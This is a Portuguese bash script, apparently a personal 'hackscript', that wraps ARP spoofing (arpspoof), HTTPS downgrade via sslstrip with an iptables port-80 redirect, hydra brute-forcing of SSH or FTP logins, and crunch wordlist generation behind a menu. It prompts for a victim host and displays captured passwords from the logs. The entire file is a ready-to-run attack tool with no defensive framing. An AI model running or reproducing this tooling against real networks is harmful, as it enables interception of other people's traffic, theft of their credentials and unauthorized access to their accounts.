#!/bin/bash

########################################
# Desenvolvido por RAFAEL HARZER CORREIA
########################################


RED='\033[0;31m'
NC='\033[0m'
blu='\033[0;34m'

arquivo_saida=""
arquivo_word=""

check(){
check_ssl=$(dpkg -l | grep sslstrip )
        if [ -z $check_ssl];then
                apt update
		apt install sslstrip -y
        fi
clear
check_arp=$(which arpspoof )
        if [ -z $check_arp];then
                apt update
		apt install dsniff -y
        fi
clear
check_hydra=$(dpkg -l | grep hydra )
        if [ -z $check_hydra];then
                apt update
		apt install hydra -y
        fi
clear
check_crunch=$(which crunch )
        if [ -z $check_crunch];then
                apt update
                apt install crunch -y
        fi

menu

}

wordlist(){
	echo " "
	echo "Qual o nome da wordlist?"
	read wordlistname
	arquivo_word=$wordlistname
	echo "Qual o tamanho da senha ex 8 10 ( de 8 a 10 caracteres)?"
	read tamanho
	echo "Quis caracteres?"
	read digitos
	read -p "Existe um padrao na senha s/n ? " opt
	if [ $opt = "S" ] || [ $opt = "s" ];then
		echo "Informe o padrao! ex: voce sabe que a senha termina com 1997 e tem 8 digitos entao @@@@1997"
		read padrao
		crunch $tamanho $digitos -t $padrao -o $wordlistname
	else
		crunch $tamanho $digitos -o $wordlistname
	fi	
	read -p "wordlist criada com sucesso... enter para voltar ao menu!"
	menu
}

ArpAtack(){
	echo 1 > /proc/sys/net/ipv4/ip_forward	
	printf "Qual o host da vitima? \n"
	read host
	gatewai_host=$(ip route show | grep via | cut -d " " -f3)	
	echo "$host $route"	
	interface=$(ip link show | grep 2: | cut -d " " -f2 | tr -d ":" )
	xterm -hold -e "arpspoof -i $interface -t $host $gatewai_host" &  		
	menu
}

sslAtack(){
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 1000
	printf "Qual o nome desejado da saida da log do sslstrip? \n"
	read saida
	arquivo_saida=$saida
	xterm -hold -e "sslstrip -l 1000 -w $saida.log" &
	menu
}

AtackH(){
	printf "Qual o nome de usuario? \n"
	read usuario
	if [ ! -z $arquivo_word ];then
		read -p "Deseja usar a wordlist $arquivo_word S/n? " opt
		if [ $opt = "S" ] || [ $opt = "s" ];then
			wordlist=$arquivo_word
		else
			printf "Indique o caminho da wordlist \n"
        		read wordlist
		fi
	fi
	if [  -z $arquivo_word ];then
		 printf "Indique o caminho da wordlist \n"
                 read wordlist
	fi
	echo "Qual o host da vitima?"
	read host	
	echo "Qual o servico ssh ou ftp"
	read servico	
	xterm -hold -e "hydra -l $usuario -P $wordlist $host -t 16 $servico" &
	menu
}

exibir(){
	
	if [ -z $arquivo_saida ];then
		echo "Arquivo ainda sem log!"
	else
		cat $arquivo_saida.log
	fi
	
	read -p "Enter para voltar ao menu! ..."
	menu
}
menu(){
    clear
    check_root=$(id -u)
    if [ $check_root -eq "0" ];then #checa se o usuário é root
	printf "${blu}================================================================${RED}\n"
        echo "  Hackscript Arp Atack and BruterForce        BY: Rafael Harzer         "
        printf "${blu}================================================================${NC}\n"
        echo " "
        printf "${blu}1${NC} - Ataque ARPspoof \n"
        printf "${blu}2${NC} - sslstrip \n"
        printf "${blu}3${NC} - Configurar Bruterforce \n"
	printf "${blu}4${NC} - Cria wordlist \n"
        printf "${blu}5${NC} - Exibe as senhas capituradas nos logs \n"
	printf "${blu}0${NC} - Finaliza o script! \n"
	printf "\n"
	read -p "-->" opt
        case $opt in
            0)printf "${RED}Script Finalizado${NC}\n";sleep 2;clear;exit;;
            1)ArpAtack;;
            2)sslAtack;;
            3)AtackH;;
	    4)wordlist;;
	    5)exibir;;
            *)printf "${RED}Opção inválida${NC}\n";sleep 2;menu;;
        esac
    else
        printf "${RED}Você não é usuário administrador, execute o script como administrador!${NC}"
        sleep 3
        clear
    fi
}
check 
menu
